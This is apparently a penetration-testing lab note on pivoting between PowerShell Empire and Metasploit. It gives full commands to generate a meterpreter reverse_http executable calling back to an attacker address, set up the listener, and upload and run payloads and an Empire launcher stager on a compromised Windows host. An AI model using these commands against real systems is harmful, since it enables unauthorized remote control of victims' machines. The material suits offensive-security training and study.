If a PowerShell Empire agent is active on the host, we can use msfvenom to generate a meterpreter
reverse shell as an executable:

kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -f exe -o met.exe
kali$ msfconsole
	> use multi/handler
	> set payload windows/meterpreter/reverse_http
	+ set the rest parameters
	> exploit

now we switch back to our PowerShell Empire shell and upload the executable
empire:
> upload /home/kali/met.exe
> shell dir
> shell C:\Users\offsec.corp\Downloads>met.exe
With the executable running, weâ€™ll switch back to our meterpreter listener and watch the incoming shell

# ================================================================================================

Reversing this process to connect to an Empire agent from an existing meterpreter session:

(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

Then in msfconsole we can upload and execute it:

meterpreter > upload /tmp/launcher.bat
meterpreter > shell
C:\Users\offsec.corp\Downloads> dir
C:\Users\offsec.corp\Downloads>launcher.bat

Now we should receive an Empire agent from the compromised host:
(Empire: agents) > [+] Initial agent LEBYRW67 from 10.11.0.22 now active (Slack)
